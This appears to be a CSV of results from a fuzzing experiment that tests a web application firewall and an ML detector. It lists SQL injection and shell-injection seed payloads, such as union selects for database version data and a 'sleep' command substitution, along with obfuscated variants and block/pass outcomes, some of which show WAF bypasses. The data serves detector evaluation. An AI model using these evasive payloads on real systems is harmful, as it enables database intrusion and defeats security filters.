Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
23,2025-10-23T17:19:28.426950," select * from users where id  =  1 union select .1$_,version  (    )   -- 1",403,403,200,waf_correct_ml_incorrect," seLECt * FROM users WHEre id   lIkE   (SElect/**/1) union SElECT .0x1$_,version  (   
)   -- 'o^'!='o^c'",2025-10-23T17:19:45.709724,403,403,both_correct," SELeCt * FRoM users wHEre id   LIke   (SELECT/*Q^IS*/0x2299 LIkE (seLeCt 1)) union sELeCt .0x1$_,version  (   	)  /**/-- 'o^'!='o^c'",2025-10-23T17:20:04.819129,403,403,both_correct," SelECt * fRom users WHErE id   likE /*\[_oi*/ (Select/*Q^IS*/0x2299 LikE (sElECt (seLecT 530<>(SELECT 1)))) union SeLECt .0x1$_,version  (   
)  /**/-- 'o^'!='o^c'",2025-10-23T17:20:22.311530,403,403,both_correct," SElecT * FROm users WherE id   lIKe /*\[_oi*//**/(SelecT/*Q^IS*/0x2299 LIkE (SeLect (selecT '\k' like '\k' NOT LIKE (SElECT 0x1)))) union seLeCT .0x1$_,version  (    )  /*/0d>4*/-- 'o^'!='o^c'",2025-10-23T17:20:40.410634,403,403,both_correct," SeLEct *
fRoM users whEre id   LIKE /*\[_oi*//**/(SElect/*>v/7*/0x2299 LiKE (SEleCt (select '\k' lIke '\k' not like (sElECT 0x1))))/**/union sELeCt .0x1$_,version  (    )  /*/0d>0x20ec= OR 0*/-- 'o^'!='o^c'",2025-10-23T17:20:58.822157,403,403,both_correct," SeLEct *
FroM users WHEre id   Like
/*\[_oi*//**/(SElECT/*>v/2562 IN (2561,2562, OR 0)*/0x2299 liKe (SeLECT (sELEct '\k' LIkE '\k' not like (sELECt 0x1))))/**/union/**/SeLEcT .0x1$_,version  (    )  /*/0d>0x20ec= OR (SELECT 0)*/-- 'o^'!='o^c'QZ",2025-10-23T17:21:16.554572,403,403,both_correct," SELEct *
fRoM users WHerE id   liKE
/*\[_oi*//**/(seleCT/*>v/2562 IN (0xa01,2562, OR 8699 NOT LIKE 8700)*/0x2299 lIkE (selECt (sELecT '\k' LIKE '\k'
not like (SelECT 0x1))))/**/union/**/selECt .0x1$_,version  (    ) /**//*/0d>0x20ec= OR (SELECT (SELECT 1))*/-- 'o^'!='o^c'QZbf",2025-10-23T17:21:36.515543,403,403,both_correct," sELEcT *
fROM users wHeRE id   LiKE
/*\[_oi*//**/(SELeCt/*>v/0x1c53<>7252 IN (0xa01,2562, OR 8699 NOT LIKE 8700)*/0x2299 liKe (SElect (SELeCt '\k' lIke '\k'
not like (SELecT 0x1)))) union/**/selECT .0x1$_,version  ( 
  ) /* OR 0$*//*/0d>0x20ec= OR (SELECT (SELECT 1))*/-- 'o^'!='o^c'QZbf",2025-10-23T17:22:02.417318,403,403,both_correct," SELeCt *
fRom users WHere id   LikE /*\[_oi*/ (SeLeCt/*>v/0x1c53<>(SELECT 1)<>9017 IN (0xa01,2562, OR 8699 NOT LIKE 0x21fc)*/0x2299 LikE (select (SELecT '\k' liKE '\k'
not like (SeLeCt 0x1)))) union/**/sELect .0x1$_,version  ( 
  ) /*1D*//*/0d>0x20ec= OR (SELECT (SELECT 1))*/-- 'o^'!='o^c'QZbf",2025-10-23T17:22:19.709738,403,403,both_correct," sElecT * fRom users whERE id   like /*\[_oi*/ (SElEct/*>v/0x1c53<>(SELECT/**/0x1)<>1730 NOT LIKE  OR 0 in (0xa01,2562, Or 8699 NOT LIKE 0x21fc)*/0x2299 lIKe (SElEct (SElEct '\k' liKe '\k'
not like (sElECt 0x1)))) union/**/selecT .0x1$_,version  ( 
  ) /**//*/0d>0x20ec= OR (SELECT (SELECT 1))*/-- 'o^'!='o^c'QZbf""x",2025-10-23T17:22:37.213844,403,403,both_correct
24,2025-10-23T17:22:54.512773, or 'unusual'   =   'unusual',403,200,403,waf_incorrect_ml_correct,"/**/OR
(sELeCT 6277)<> ANd 1",2025-10-23T17:23:11.005452,403,403,both_correct,"/*S^*/Or
(seLEcT 6277)<>/**/AnD  aNd 8393	NOT LIKE 0x20ca",2025-10-23T17:23:29.750959,403,403,both_correct,"/**/oR
(SeleCT '~]5'='~](SELECT/**/5)')<>/*=. */anD 	And (SELect 1)	not like 0x20ca",2025-10-23T17:23:47.403066,403,403,both_correct,"/**/or
(seleCt '~](SELECT 'Vj'!='VjW')' like '~](SELECT  OR 0)')<>/*=. */AnD 
and (SElecT 1)	not like 0x20ca",2025-10-23T17:24:04.889418,403,403,both_correct,"/**/oR (seleCt '~](SELECT 'Vj'!='VjW')' lIKE '~](SELECT  OR  OR (SELECT 0))')/**/NOT LIKE /**/aND 
anD (SElect 'R+'!='R+<')	not like 0x20ca",2025-10-23T17:24:21.606515,200,403,waf_incorrect_ml_correct,"/**/OR (sELeCT '~](SELECT 'Vj'!='VjW')' lIKe '~](SELECT  OR  OR/**/(SELECT  AND (SELECT 1) LIKE 6643))')/**/not like /**/AnD  and (SelecT 'R+'!='R+<')	not like 0x20ca",2025-10-23T17:24:39.184722,200,403,waf_incorrect_ml_correct,"/*w(*/or (SeleCT '~](SELECT 'Vj'!='VjW')' liKE '~](SELECT  OR  OR (SELECT  AND (SELECT (SELECT 'F' LIKE 'F')) LIKE  AND 1))')/**/not like /**/aND  aND (sElEcT 'R+' not like 'R+<')
not like 0x20ca",2025-10-23T17:24:56.655538,200,403,waf_incorrect_ml_correct,"/*w(*/or (sELeCT '~](SELECT 'Vj'!='VjW')' lIKe '~](SELECT  OR  OR (SELECT  AND (SELECT (SELECT 'F' LIKE 'F')) LIKE  AND (SELECT (SELECT 6022 IN (6021,6022,6023)))))')/**/not like /**/aND  aND (SeLECT 'R+' not like 'R+<')	not/**/like 0x20ca",2025-10-23T17:25:14.402952,200,403,waf_incorrect_ml_correct,"/*w(*/Or (sElECt '~](SELECT 'Vj'!='VjW')' LIKe '~](SELECT  OR  OR (SELECT  AND (SELECT (SELECT 'F'/**/LIKE 'F')) LIKE  AND (SELECT (SELECT 0x1786 IN ( AND 1,':'!=':g',6023)))))')/**/not like /**/AnD  && (SELeCT 'R+' not like 'R+<') not/*EQi*/lIKE 0x20ca",2025-10-23T17:25:30.967526,403,403,both_correct,"/*w(*/Or (SeleCt '~](SELECT 'Vj'!='VjW')' LIkE '~](SELECT  OR  OR (SELECT  AND (SELECT (SELECT 'F' LIKE 'F')) LIKE  AND (SELECT (SELECT 0x1786 IN ( AND 'Y-'<>'Y-.',':'!=':g', OR (SELECT 0))))))')/*uS U*/not like /**/And   aND 
(SELeCT 'R+' not like 'R+<') not/**/LikE 0x20ca",2025-10-23T17:25:47.930181,403,403,both_correct
25,2025-10-23T17:26:05.206661,char%4039%41%2b%40SELECT,403,200,200,both_incorrect,"char% or 0%(seLeCT/**/9438) LIKE	9438%2b%40SELECT",2025-10-23T17:26:21.957328,200,403,waf_incorrect_ml_correct,"char% Or 0%(sELect/**Vln@*/'|' NOT LIKE '|O')/**/Like	(sELEcT	(SELECT 1))%2b%40SELECT",2025-10-23T17:26:40.744144,200,403,waf_incorrect_ml_correct,"char% oR
525!=526%(seLECT/**Vln@*/'|' not like '|O') like	(SElEcT	(SELeCT (select  ANd 1)))%2b%40SELECT",2025-10-23T17:26:58.576293,403,403,both_correct,"char% or
 AND 1 liKe 7371<>526%(sELect/**Vln@*/'|' not like '|O') LikE	(SELeCT
(SeleCT (SeLect /**/ANd (SELECT 1))))%2b%40SELECT",2025-10-23T17:27:15.810905,403,403,both_correct,"char% oR
 and 7829=7829 LIKe (SeLEcT 7371)!= AND 1%(sELeCT/**Vln@*/'|' not like '|O') like	(SeleCt	(SeLeCT/*<U2*/(select /**/ANd (SelecT 1))))%2b%40SELECT",2025-10-23T17:27:32.084396,403,403,both_correct,"char% Or
/**/aND 0x1e95=7829 Like (Select 6497 not like (selecT 1))!= AnD 1%(selecT/**Vln@*/'|' not like '|O') LIKE	(SeleCt (SeLeCt/**/(SeLeCt /*P*/and (SEleCT 1))))%2b%40SELECT",2025-10-23T17:27:49.228457,403,403,both_correct,"char% or
/*H*/and 0x1e95=(SELECT 1) lIkE (seLeCT 6497 not like (sELeCT 0x1)) not like  AND 1%(SelECT/**Vln@*/'|' not like '|O') LIke
(sElECT (SELect (select /*P*/anD (sEleCt 9915<>9916))))%2b%40SELECT",2025-10-23T17:28:08.554061,403,403,both_correct,"char% OR
/*H*/aND 0x1e95 LIKE (seLecT  AND 1) LIke (sElect 6497 not like (SeLect 0x1))
not like  aND 1%(SElECt/**Vln@*/'|' not like '|O') LiKe
(sELECt (SELecT (SeLect  aND (sElEct '
!' NOT LIKE '
!V'<>(SELECT 9916)))))%2b%40SELECT",2025-10-23T17:28:25.923659,403,403,both_correct,"char% Or
/**/anD 0x1e95 lIKE (SelECT  AND (SELECT 'ES' like 'ES')) liKe (sELeCt/**/6497 not like (Select 0x1))
not like 
aNd 1%(SeLect/**Vln@*/'|' not like '|O') LikE
(SELecT (sELECT (sElecT  And (SElecT '
!' NOT LIKE '
!V'<>(SelEcT (SELECT 9916))))))%2b%40SELECT",2025-10-23T17:28:42.717191,403,403,both_correct,"char%
Or
/**/And 0x1e95 liKe (SeLEcT  aND (sELeCt 'ES' likE 'ES')) LIKE (SeleCt/*2*/6497 not like (SEleCt 0x1))
not like 
aNd/**/ and 1 not like 0x267a%(selECt/**Vln@*/'|' not like '|O') lIKe
(SElEcT (seLEcT (seleCT  ANd (SelecT '
!' NOT LIKE '
!V'<>(sElEct (SeLECT 9916))))))%2b%40SELECT",2025-10-23T17:28:59.838132,403,403,both_correct
26,2025-10-23T17:29:18.167593,exec sp,403,403,200,waf_correct_ml_incorrect,exec/*QB7g*/sp,2025-10-23T17:29:34.581298,200,403,waf_incorrect_ml_correct,exec/*)3B}*/sp,2025-10-23T17:29:51.899387,200,403,waf_incorrect_ml_correct,exec/*)3B}*/sp,2025-10-23T17:30:09.462139,200,403,waf_incorrect_ml_correct,exec/*)3B}*/sp,2025-10-23T17:30:27.841572,200,403,waf_incorrect_ml_correct,exec/*)3B}*/sp,2025-10-23T17:30:44.369676,200,403,waf_incorrect_ml_correct,exec/*)3B}*/sp,2025-10-23T17:31:01.348780,200,403,waf_incorrect_ml_correct,exec/*)3B}*/sp,2025-10-23T17:31:18.749682,200,403,waf_incorrect_ml_correct,exec/*)3B}*/sp,2025-10-23T17:31:37.418749,200,403,waf_incorrect_ml_correct,exec/*)3B}*/sp,2025-10-23T17:31:56.413883,200,403,waf_incorrect_ml_correct,exec/*)3B}*/sp,2025-10-23T17:32:13.656065,200,403,waf_incorrect_ml_correct
27,2025-10-23T17:32:39.308115,$  (  sleep 50  ) ,403,403,200,waf_correct_ml_incorrect,"$/**/ (  sleep  AND 0x1
 ) ",2025-10-23T17:32:55.874211,200,403,waf_incorrect_ml_correct,"$/*t*/ ( 	sleep/**/ && 0x1
 ) ",2025-10-23T17:33:14.331764,200,403,waf_incorrect_ml_correct,"$/*U=*/ ( 
sleep   AND  0x1
 ) ",2025-10-23T17:33:33.146664,403,403,both_correct,"$  ( 	sleep   &&  0x1
 ) ",2025-10-23T17:33:50.772069,403,200,waf_correct_ml_incorrect,"$  ( 	sleep	 /*z*/ and   0x1
 ) ",2025-10-23T17:34:08.104301,403,403,both_correct,"$  ( 	sleep	   aNd   0x1  ) ",2025-10-23T17:34:25.542620,403,200,waf_correct_ml_incorrect,"$  ( 	sleep		  and   0x1/**/ ) ",2025-10-23T17:34:42.467757,403,403,both_correct,"$  (		sleep		  ANd   0x1/**//**/) ",2025-10-23T17:34:59.439211,403,403,both_correct,"$ 
(		sleep		  and   0x1 /**/) ",2025-10-23T17:35:16.826862,403,403,both_correct,"$/**/
(		sleep		  and 
 0x1 /*o3R*/) ",2025-10-23T17:35:33.813499,403,403,both_correct
28,2025-10-23T17:35:56.546677," select * from users where id  =  1 or "",#"" or 1  =  1 -- 1",403,403,403,both_correct," SeLEct * FROM users whERe id /**/=  1 oR "",#"" Or (SeLEct 1)   liKe	  1 --  OR 3025=3025!3",2025-10-23T17:36:13.261925,403,403,both_correct," SELeCT * frOM users wHERe id /*a2*/ lIKe  	(seLEct 1) or "",#"" OR (seleCT/**/0x1)   likE	  1 --  OR 3025=3025!'-/s' NOT LIKE '-/s7'",2025-10-23T17:36:32.333951,403,403,both_correct," selecT * frOM users WHerE id /*a2*/ like  
(sElEcT 1) || "",#"" Or (SEleCt 0x1)   LIkE	  1 --  OR 3025=0xbd1!'-/s' NOT LIKE '-/s7' OR '4'='4'",2025-10-23T17:36:49.601531,403,403,both_correct," sELecT * frOm users wHERe id /**/ LIKe  	(sElect 0x1)  Or  "",#"" Or (selECt 0x1)   LiKE	  (SELECT 1) --  OR 'c)' NOT LIKE 'c))'=0xbd1!'-/s' NOT LIKE/**/'-/s7' OR '4'='4'",2025-10-23T17:37:07.547460,403,403,both_correct," seLecT * FRom users wHEre id /**/ liKE  	(sElEct 0x1)  Or  "",#"" oR (seleCT 0x1) 	 LiKE	  (SeleCT (selEcT 4604 IN (4603,4604,4605))) --  OR 'c)' NOT LIKE 'c))'=0xbd1!'-/s' NOT LIKE '-/s7' OR '4'=' OR 0'?5",2025-10-23T17:37:25.229713,403,403,both_correct," sElecT * FrOM users WHeRe id   LIKe  	(SELeCt 0x1)  oR  "",#"" or (SElecT 0x1) 	 LIke
  (SelecT (sElECt 4604 in (0x11fb,4604,4605))) --  OR 'c)' NOT LIKE 'c))'=0xbd1!'-/s' NOT LIKE '-/s7' OR ' AND 1'=' OR 0'?' H
'=' H
'>h",2025-10-23T17:37:42.442643,403,403,both_correct," seleCt * FrOM users WHErE id   LiKe  	(SelECt 0x1)  OR  "",#"" OR/**/(seLECT 0x1) 	 LIKE
	 (sElECT (SELecT 4604 In (0x11fb,'l' liKE 'l',(sElect 4605)))) --  OR 'c)' NOT LIKE 'c))'=0xbd1!'-/s' NOT LIKE '-/s7' OR ' AND  OR 0'=' OR 0'?' H
'=' H
'>h7",2025-10-23T17:38:00.447875,403,403,both_correct," seleCT * FRoM users wHere id   LiKe  	(select 0x1)  or  "",#"" Or/**/(seLect 0x1) 	 LIke
	 (SeLECt (SELEct '_'='_' in (0x11fb,'l' lIkE 'l',(SeleCt 4605)))) --  OR 'c)' NOT LIKE 'c))'=0xbd1!'-/s' NOT LIKE/*)\Em*/'-/s7' OR ' AND  OR 0x0'=' OR (SELECT 1)'?' H '=' H
'>h7",2025-10-23T17:38:18.457696,403,403,both_correct," SelecT * fROM users wHErE id   lIKE  	(SElect 0x1)  Or  "",#"" OR (sElect 0x1) 	 likE
	 (sElECt (sElECT '_' LIKE '_' IN (0x11fb,'l' Like 'l',(SELEct ';'!=';F')))) --  OR 'c)' NOT LIKE 'c))'=0xbd1!'-/s' NOT LIKE/*)\Em*/'-/s7' OR ' AND  OR 0x0'=' OR (SELECT (SELECT	(SELECT 1)))'?' H '=' H
'>h7",2025-10-23T17:38:35.195017,403,403,both_correct," SeLeCT * fRoM users WHere id   LIkE  	(SElecT 0x1)  or  "",#"" OR (SELECt 0x1) 	 Like
	 (SELeCT (SeLect '_' LiKE '_' In (0x11fb,(SELECT 1),(SEleCT ';' not like ';F')))) -- /**/OR 'c)' NOT LIKE 'c))'=0xbd1!'-/s' NOT LIKE/*)\Em*/'-/s7' OR ' AND
 oR 0x0'=' oR (SELECt (selecT	(seLeCT 0x1)))'?' H '=' H
'>h7",2025-10-23T17:38:52.961551,403,403,both_correct
29,2025-10-23T17:39:10.266904," select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1",403,403,403,both_correct," sElecT * frOm users WHerE id  =
 1 *'8H'!='8HC' union SElEcT 0x1,banner FROM v$version whERE rownum/**/  like    oR 0 -- 1wR",2025-10-23T17:39:26.852085,403,403,both_correct,"/**/SeLect * fRom users wHErE id   like 
  ANd 0x33c=828 *'8H'!='8HC' union sELect 0x1,banner FRoM v$version WhErE rownum/**/  LikE  
 oR 0 -- 1wR",2025-10-23T17:39:45.135661,403,403,both_correct,"/*t<oo*/SelECt * From users whERE id   liKe    And 0x33c LIKE (SELECT 828) *'8H'!='8HC' union sELECt/**/0x1,banner FRoM v$version WhERe rownum/**/  LIkE  
 Or  OR 'K;tz' NOT LIKE 'K;tz5' -- 1wR",2025-10-23T17:40:02.383343,403,403,both_correct,"/*t<oo*/SELeCt * FRoM users	WheRE id   LIkE    aND 0x33c lIKe (seLeCT (SeleCT 8854 LIKE  AND 1)) *'8H'!='8HC' union SElect/***/0x1,banner FrOm v$version wHERE rownum/**/  LIKe  
 or  or/**/'K;tz' NOT LIKE 'K;tz5' -- 1wR",2025-10-23T17:40:20.422002,403,403,both_correct,"/**/select * fRoM users	whERe id   LIke    AnD 0x33c LIKe (SEleCt (sEleCT  Or '6' LIKE '6' LIKE  anD 0x1))
*'8H'!='8HC' union seLecT/***/0x1,banner fROm v$version wheRE rownum/**/  liKE  
 Or  or 'K;tz' not like 'K;tz5' -- 1wRs'",2025-10-23T17:40:37.605906,403,403,both_correct," seLEct * fRoM users	WHerE id   Like    and 0x33c lIKe (sELECT (seLecT  Or '(SELECT 7020 NOT LIKE 7021)' LIKe '(SELECT 1)' LiKE  ANd 0x1)) *'8H'!='8HC' union sELEcT/***/0x1,banner fRoM v$version whERE rownum/**/  LIkE  
 Or  oR 'K;tz' not like 'K;tz5' -- 1wRs'9",2025-10-23T17:40:55.006087,403,403,both_correct," sElEcT * FROM users	wHEre id   LIKe    aNd 0x33c LiKE (SeleCT (sElECt  oR '(SELECT  AND 0x1	NOT LIKE 'd*\J'='d*\J')' LiKE '(SELECT 1)' like  aNd 0x1)) *'8H' not like '8HC' union SElECT/***/0x1,banner FROm v$version WHERe/**/rownum/**/  lIKe  
 or  oR 'K;tz' not like 'K;tz5' -- 1wRs'9",2025-10-23T17:41:12.461602,403,403,both_correct," SeleCT * fROM users	wHeRE id   liKE    And 0x33c LIke (sElECt (seleCt  oR '(SELECT  AND 0x1	NOT LIKE 'd*\J'='d*\J')' LiKE '(SELECT 0x1)' LikE  aNd 0x1)) *'8H' not like '8HC' union SElECt/***/0x1,banner FrOM v$version WHEre rownum/*KD!L*/  LikE    or  oR 'K;tz' not like 'K;tz5' -- 1wRs''{-' NOT LIKE '{-x'",2025-10-23T17:41:30.804490,403,403,both_correct," sElECt * fRom users	whERe id   LiKe    AND 0x33c LiKe (SElecT (sElEcT  Or '(SELECT  AND 0x1
NOT LIKE 'd*\J'='d*\J')' LiKE '(SELECT 0x1)' lIKE  AND 0x1)) *'8H' not like '8HC' union SeLECT/***/0x1,banner FROm v$version WhEre rownum   LIke    OR  Or 'K;tz' not like 'K;tz5' -- 1wRs''{-' NOT LIKE '{-x'g",2025-10-23T17:41:48.799255,403,403,both_correct," sElecT * from users
WheRe id   LiKe    anD 0x33c like (SElEcT (sElECT  Or '(SELECT  AND 0x1
NOT LIKE 'd*\J'='d*\J')' liKE '(SELECT 0x1)' liKe  And 0x1)) *'8H' not/**/like '8HC' union sElEct/***/0x1,banner fROm v$version wHErE rownum   Like    or  or 'K;tz' not like 'K;tz5' -- 1wRs''{-' NOT LIKE '{-x'g",2025-10-23T17:42:06.225825,403,403,both_correct
30,2025-10-23T17:42:23.091509," select * from users where id  =  '1' union select +\.,@@VERSION -- 1'",403,403,403,both_correct,"
seleCt * FRom users wHeRe id   like   '1' union SelEcT +\.,@@VERSION/**/-- (SELECT  AND 1<>8337)'",2025-10-23T17:42:40.487099,403,403,both_correct,"	SELeCt * fROM users wHeRe id   lIKe /**/ '(SELECT 0x1)' union SeLect +\.,@@VERSION/*/rNbo*/-- (SELECT  AND 1<>'w^lg'!='w^lgC')'",2025-10-23T17:42:58.680298,403,403,both_correct,"
seLEct * frOm users wHeRE id  /**/liKe /**/ '(SELECT 0x1)' union seLECt +\.,@@VERSION/*/rNbo*/-- (SELECT  AND 0x1<>'w^lg'!='w^lgC')' AND 1>",2025-10-23T17:43:16.059395,403,403,both_correct,"
SElecT * FrOM users WHERe id  /**/LiKE /**/ '(SELECT 0x1)' union SElEct +\.,@@VERSION/*/rNbo*/--
(SELECT  AND 0x1<>'w^lg'!='w^lgC')'/*3 c@*/AND  OR (SELECT '%' NOT LIKE '%}')>",2025-10-23T17:43:33.282700,403,403,both_correct,"	sEleCt * froM users wHeRE id  /**/LiKE   '(SELECT 0x1)' union sELEcT +\.,@@VERSION/*/rNbo*/--
(SEleCT  And 0x1<>'w^lg'!='w^lgC')'/* AND 0x1 c@*/AND  OR (SELECT '%' NOT LIKE '%}')>",2025-10-23T17:43:50.632395,403,403,both_correct,"
sELEct * FROM users where id  /**Qs*/lIkE   '(SELECT 0x1)' union seLECT +\.,@@VERSION/*/rNbo*/--
(seLEcT  aND 0x1<>'w^lg'<>'w^lgC')'/* AND 0x1/**/c@*/AND  OR (SELECT '%' NOT LIKE '%}')>",2025-10-23T17:44:09.043289,403,403,both_correct,"	seLEcT * FrOm users WheRE id  /**Qs*/LIKE   '(SELECT 0x1)' union seleCT +\.,@@VERSION/*/rNbo*/--
(sElECT  And 0x1<>'w^lg' NOT LIKE 'w^lgC')'/*`8vj5*/AND  OR (SELECT '%' NOT LIKE '%}')>",2025-10-23T17:44:25.252998,403,403,both_correct,"	SELeCt *	fROM users wHeRE id  /**Qs*/like   '(SELECT 0x1)' union SeLECt +\.,@@VERSION/*/rNbo*/--
(seLECT  anD 0x1<>'w^lg' NOT LIKE 'w^lgC')' AND  OR (SELECT '%' NOT LIKE '%}')>",2025-10-23T17:44:42.338022,403,403,both_correct,"	sElEcT *	FRoM users WHere id  /**Qs*/lIkE   '(SELECT 0x1)' union/**/selEct +\.,@@VERSION/*/rNbo*/--
(SeLeCT 
anD 0x1<>'w^lg' not like 'w^lgC')' AND  OR (SELECT '%' NOT LIKE '%}')>",2025-10-23T17:45:00.301076,403,403,both_correct,"	sElECT *	FroM users WHERe id  /**Qs*/Like   '(SELECT 0x1)' union sELeCt +\.,@@VERSION/*/rNbo*/--
(SelEct 
AND 0x1!='w^lg' not like 'w^lgC')' AND  OR (SELECT '%' NOT	LIKE '%}')>",2025-10-23T17:45:17.029664,403,403,both_correct
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Overall Results,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WAF TP,202,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WAF TN,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WAF FP,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WAF FN,128,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML TP,288,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML TN,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML FP,0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML FN,42,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Combined Results (2x2 Matrix),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,WAF Correct,WAF Incorrect,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML Correct,193,95,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML Incorrect,9,33,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
